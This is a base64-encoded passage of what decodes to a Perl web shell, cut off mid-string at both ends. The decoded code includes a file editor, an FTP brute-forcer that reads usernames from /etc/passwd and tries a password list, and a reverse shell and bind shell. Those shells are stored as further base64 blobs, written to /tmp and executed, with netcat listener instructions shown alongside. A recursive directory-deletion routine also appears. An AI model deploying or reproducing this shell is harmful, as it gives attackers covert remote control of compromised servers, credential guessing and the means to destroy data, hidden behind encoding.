GRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IiRmaWxlIiA+ICRzYXZlIDxicj4gJG1zZwoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+CkVORAoJCgkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCZGaWxlT3BlbigkRmlsZSwwKSk7CgkkcmVzdWx0IC49ICI8L3RleHRhcmVhPiI7CgkkcmVzdWx0IC49ICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBGaWxlIE9wZW4KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgRmlsZU9wZW4oJCl7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJGJpbmFyeSA9IHNoaWZ0OwoJbXkgJHJlc3VsdCA9ICIiOwoJbXkgJG4gPSAiIjsKCWlmKC1mICRmaWxlKXsKCQlpZihvcGVuKEZJTEUsJGZpbGUpKXsKCQkJaWYoJGJpbmFyeSl7CgkJCQliaW5tb2RlIEZJTEU7CgkJCX0KCQkJd2hpbGUgKCgkbiA9IHJlYWQgRklMRSwgJGRhdGEsIDEwMjQpICE9IDApIHsKCQkJCSRyZXN1bHQgLj0gJGRhdGE7CgkJCX0KCQkJY2xvc2UoRklMRSk7CgkJfQoJfWVsc2UKCXsKCQlyZXR1cm4gIk5vdCdzIGEgRmlsZSEiOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIFNhdmUgRmlsZQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CnN1YiBTYXZlRmlsZSgkKQp7CglteSAkRGF0YT0gc2hpZnQgOwoJbXkgJEZpbGU9IHNoaWZ0OwoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJEZpbGU7CglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkKCXsKCQliaW5tb2RlIEZJTEU7CgkJcHJpbnQgRklMRSAkRGF0YTsKCQljbG9zZSBGSUxFOwoJCXJldHVybiAxOwoJfWVsc2UKCXsKCQlyZXR1cm4gMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyIEZvcm0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQnJ1dGVGb3JjZXJGb3JtCnsKCW15ICRyZXN1bHQ9IiI7CgkkcmVzdWx0IC49IDw8RU5EOwoKPHRhYmxlPgoKPHRyPgo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzxicj4KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+Ck5vdGU6IE9ubHkgc2NhbiBmcm9tIDEgdG8gMyB1c2VyIDotUzxicj4KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJydXRlZm9yY2VyIi8+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPgpFTkQKY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsKJHJlc3VsdCAuPSA8PCdFTkQnOwo8L3RleHRhcmVhPjwvdGQ+Cjx0ZD4KClBhc3M6PGJyPgo8dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJwYXNzIj4xMjNwYXNzCjEyMyFAIwoxMjNhZG1pbgoxMjNhYmMKMTIzNDU2YWRtaW4KMTIzNDU1NDMyMQoxMjM0NDMyMQpwYXNzMTIzCmFkbWluCmFkbWluY3AKYWRtaW5pc3RyYXRvcgptYXRraGF1CnBhc3NhZG1pbgpwQHNzd29yZApwQHNzdzByZApwYXNzd29yZAoxMjM0NTYKMTIzNDU2NwoxMjM0NTY3OAoxMjM0NTY3ODkKMTIzNDU2Nzg5MAoxMTExMTEKMDAwMDAwCjIyMjIyMgozMzMzMzMKNDQ0NDQ0CjU1NTU1NQo2NjY2NjYKNzc3Nzc3Cjg4ODg4OAo5OTk5OTkKMTIzMTIzCjIzNDIzNAozNDUzNDUKNDU2NDU2CjU2NzU2Nwo2Nzg2NzgKNzg5Nzg5CjEyMzMyMQo0NTY2NTQKNjU0MzIxCjc2NTQzMjEKODc2NTQzMjEKOTg3NjU0MzIxCjA5ODc2NTQzMjEKYWRtaW4xMjMKYWRtaW4xMjM0NTYKYWJjZGVmCmFiY2FiYwohQCMhQCMKIUAjJCVeCiFAIyQlXiYqKAohQCMkJCNAIQphYmMxMjMKYW5oeWV1ZW0KaWxvdmV5b3UKPC90ZXh0YXJlYT4KPC90ZD4KPC90cj4KPHRyPgo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+ClNsZWVwOjxzZWxlY3QgbmFtZT0ic2xlZXAiPgoKPG9wdGlvbj4wPC9vcHRpb24+CjxvcHRpb24+MTwvb3B0aW9uPgo8b3B0aW9uPjI8L29wdGlvbj4KCjxvcHRpb24+Mzwvb3B0aW9uPgo8L3NlbGVjdD4gCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+CjwvZm9ybT4KPC90YWJsZT4KRU5ECnJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCcnV0ZSBGb3JjZXIKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQnJ1dGVGb3JjZXIKewoJbXkgJHJlc3VsdD0iIjsKCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsKCWlmKCRpbnsndXNlcid9IGVxICIiKQoJewoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsKCX1lbHNlCgl7CgkJdXNlIE5ldDo6RlRQOyAKCQlAdXNlcj0gc3BsaXQoL1xuLywgJGlueyd1c2VyJ30pOwoJCUBwYXNzPSBzcGxpdCgvXG4vLCAkaW57J3Bhc3MnfSk7CgkJY2hvbXAoQHVzZXIpOwoJCWNob21wKEBwYXNzKTsKCQkkcmVzdWx0IC49ICI8YnI+PGJyPlsrXSBUcnlpbmcgYnJ1dGUgJFNlcnZlck5hbWU8YnI+PT09PT09PT09PT09PT09PT09PT0+Pj4+Pj4+Pj4+Pj48PDw8PDw8PDw8PT09PT09PT09PT09PT09PT09PT08YnI+PGJyPlxuIjsKCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpCgkJewoJCQlpZigkdXNlcm5hbWUgbmUgIiIpCgkJCXsKCQkJCWZvcmVhY2ggJHBhc3N3b3JkIChAcGFzcykKCQkJCXsKCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyAKCQkJCQlpZigkZnRwLT5sb2dpbigiJHVzZXJuYW1lIiwiJHBhc3N3b3JkIikpCgkJCQkJewoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsKCQkJCQkJJGZ0cC0+cXVpdCgpOwoJCQkJCQlicmVhazsKCQkJCQl9CgkJCQkJaWYoJGlueydzbGVlcCd9IG5lICIwIikKCQkJCQl7CgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pICogMTAwMCk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNiIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTIiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0idmluYWtpZCI+PC90ZD4KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPgoJPC9mb3JtPgoJPC90cj4KCTx0cj4KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gVGVzdGluZyAuLi4uCgk8YnI+WytdIFRyeSBjb21tYW5kOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPjxicj4KRU5ECn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJhY2tjb25uZWN0IHVzZSBwZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJhY2tCaW5kCnsKCXVzZSBTb2NrZXQ7CQoJJGJhY2twZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnU1U4Nk9sTnZZMnRsZERzTkNpUlRhR1ZzYkFrOUlDSXZZbWx1TDJKaGMyZ2lPdzBLSkVGU1IwTTlRRUZTUjFZN0RRcDFjMlVnVTI5amEyVjBPdzBLZFhObElFWnBiR1ZJWVc1a2JHVTdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnWjJWMGNISnZkRzlpZVc1aGJXVW9JblJqY0NJcEtTQnZjaUJrYVdVZ2NISnBiblFnSWxzdFhTQlZibUZpYkdVZ2RHOGdVbVZ6YjJ4MlpTQkliM04wWEc0aU93MEtZMjl1Ym1WamRDaFRUME5MUlZRc0lITnZZMnRoWkdSeVgybHVLQ1JCVWtkV1d6RmRMQ0JwYm1WMFgyRjBiMjRvSkVGU1IxWmJNRjBwS1NrZ2IzSWdaR2xsSUhCeWFXNTBJQ0piTFYwZ1ZXNWhZbXhsSUhSdklFTnZibTVsWTNRZ1NHOXpkRnh1SWpzTkNuQnlhVzUwSUNKRGIyNXVaV04wWldRaElqc05DbE5QUTB0RlZDMCtZWFYwYjJac2RYTm9LQ2s3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDSStKbE5QUTB0RlZDSXBPdzBLYjNCbGJpaFRWRVJGVWxJc0lqNG1VMDlEUzBWVUlpazdEUXB3Y21sdWRDQWlMUzA5UFNCRGIyNXVaV04wWldRZ1FtRmphMlJ2YjNJZ1BUMHRMU0FnWEc1Y2JpSTdEUXB6ZVhOMFpXMG9JblZ1YzJWMElFaEpVMVJHU1V4Rk95QjFibk5sZENCVFFWWkZTRWxUVkNBN1pXTm9ieUFuV3l0ZElGTjVjM1JsYldsdVptODZJQ2M3SUhWdVlXMWxJQzFoTzJWamFHODdaV05vYnlBbld5dGRJRlZ6WlhKcGJtWnZPaUFuT3lCcFpEdGxZMmh2TzJWamFHOGdKMXNyWFNCRWFYSmxZM1J2Y25rNklDYzdJSEIzWkR0bFkyaHZPeUJsWTJodklDZGJLMTBnVTJobGJHdzZJQ2M3SkZOb1pXeHNJaWs3RFFwamJHOXpaU0JUVDBOTFJWUTciOwoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsKCgkkQ2xpZW50QWRkciA9ICRpbnsnY2xpZW50YWRkcid9OwoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOwoJaWYoJENsaWVudFBvcnQgZXEgMCkKCXsKCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsKCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOwoJCWlmKC13ICIvdG1wLyIpCgkJewoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQoJCX1lbHNlCgkJewoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOwoJCX0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsKCQlwcmludCBGSUxFICREYXRhOwoJCWNsb3NlIEZJTEU7CgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRBZGRyICRDbGllbnRQb3J0Iik7CgkJdW5saW5rKCRGaWxlKTsKCQlleGl0IDA7Cgl9ZWxzZQoJewoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsKCQlpZigtdyAiL3RtcCIpCgkJewoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQoJCX1lbHNlCgkJewoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOwoJCX0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsKCQlwcmludCBGSUxFICREYXRhOwoJCWNsb3NlIEZJTEU7CgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRQb3J0Iik7CgkJdW5saW5rKCRGaWxlKTsKCQlleGl0IDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojICBBcnJheSBMaXN0IERpcmVjdG9yeQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSbURpcigkKSAKewoJbXkgJGRpciA9IHNoaWZ0OwoJaWYob3BlbmRpcihESVIsJGRpcikpCgl7CgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJewoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpCgkJCXsKCQkJCSRmaWxlPSAkZGlyLiRQYXRoU2VwLiRmaWxlOwoJCQkJaWYoLWQgJGZpbGUpCgkJCQl7CgkJCQkJJlJtRGlyKCRmaWxlKTsKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQl1bmxpbmsoJGZpbGUpOwoJCQkJfQoJCQl9CgkJfQoJCWNsb3NlZGlyKERJUik7Cgl9Cn0Kc3ViIEZpbGVPd25lcigkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWUgJGZpbGUpCgl7CgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07CgkJaWYoJFdpbk5UKQoJCXsKCQkJcmV0dXJuICI/Pz8iOwoJCX0KCQllbHNlCgkJewoJCQkkbmFtZT1nZXRwd3VpZCgkdWlkKTsKCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOwoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsKCQl9Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIFBhcmVudEZvbGRlcigkKQp7CglteSAkcGF0aCA9IHNoaWZ0OwoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOwoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOwoJcmV0dXJuICRwYXRoOwp9CnN1YiBGaWxlUGVybXMoJCkKewoJbXkgJGZpbGUgPSBzaGlmdDsKCW15ICR1ciA9ICItIjsKCW15ICR1dyA9ICItIjsKCWlmKC1lICRmaWxlKQoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9CgkJCWlmKC13ICRmaWxlKXsgJHV3ID0gInciOyB9CgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsKCQl9ZWxzZQoJCXsKCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsKCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsKCQkJcmV0dXJuICRyZXN1bHQ7CgkJfQoJfQoJcmV0dXJuICIwMDAwIjsKfQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWUgJGZpbGUpCgl7CgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOwoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07CgkJJHkgPSAkeSArIDE5MDA7CgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOwoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOwoJCXJldHVybiAkbG10aW1lOwoJfQoJcmV0dXJuICI/Pz8iOwp9CnN1YiBGaWxlU2l6ZSgkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWYgJGZpbGUpCgl7CgkJcmV0dXJuIC1zICIkZmlsZSI7Cgl9CglyZXR1cm4gIjAiOwp9CnN1YiBQYXJzZUZpbGVTaXplKCQpCnsKCW15ICRzaXplID0gc2hpZnQ7CglpZigkc2l6ZSA8PSAxMDI0KQoJewoJCXJldHVybiAkc2l6ZS4gIiBCIjsKCX0KCWVsc2UKCXsKCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIAoJCXsKCQkJJHNpemUgPSBzcHJpbnRmKCIlLjAyZiIsJHNpemUgLyAxMDI0KTsKCQkJcmV0dXJuICRzaXplLiIgS0IiOwoJCX0KCQllbHNlIAoJCXsKCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsKCQkJcmV0dXJuICRzaXplLiIgTUIiOwoJCX0KCX0KfQpzdWIgdHJpbSgkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nID1+IHMvXlxzKy8vOwoJJHN0cmluZyA9fiBzL1xzKyQvLzsKCXJldHVybiAkc3RyaW5nOwp9CnN1YiBBZGRTbGFzaGVzKCQpCnsKCW15ICRzdHJpbmcgPSBzaGlmdDsKCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsKCXJldHVybiAkc3RyaW5nOwp9CnN1YiBUcmltU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cL1wvL1wvL2c7Cgkkc3RyaW5nPX4gcy9cXFxcL1xcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpci4kUGF0aFNlcCk7CglteSAkcmVzdWx0ID0gIjxmb3JtIG5hbWU9J2YnIG9uU3VibWl0PVwiRW5jb2RlcignZCcpXCIgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBpZD0nZCcgbmFtZT0nZCcgc2l6ZT0nNDAnIHZhbHVlPSckQ3VycmVudERpcicgLz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdhJyB2YWx1ZT0nZ3VpJz48aW5wdXQgY2xhc3M9J3N1Ym1pdCcgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQ2hhbmdlJz48L2Zvcm0+IjsKCWlmKC1kICRwYXRoKQoJewoJCW15IEBmbmFtZSA9ICgpOwoJCW15IEBkbmFtZSA9ICgpOwoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkKCQl7CgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQoJCQl7CgkJCQkkZj0kcGF0aC4kZmlsZTsKCQkJCWlmKC1kICRmKQoJCQkJewoJCQkJCXB1c2goQGRuYW1lLCRmaWxlKTsKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7CgkJCQl9CgkJCX0KCQkJY2xvc2VkaXIoRElSKTsKCQl9CgkJQGZuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGZuYW1lOwoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsKCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+CgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggd2lkdGg9JzEwMCc+RmlsZSBTaXplPC90aD4KCQk8dGggd2lkdGg9JzE1MCc+T3duZXI8L3RoPgoJCTx0aCB3aWR0aD0nMTAwJz5QZXJtaXNzaW9uPC90aD4KCQk8dGggd2lkdGg9JzE1MCc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHdpZHRoPScyMzAnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibm90bGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmU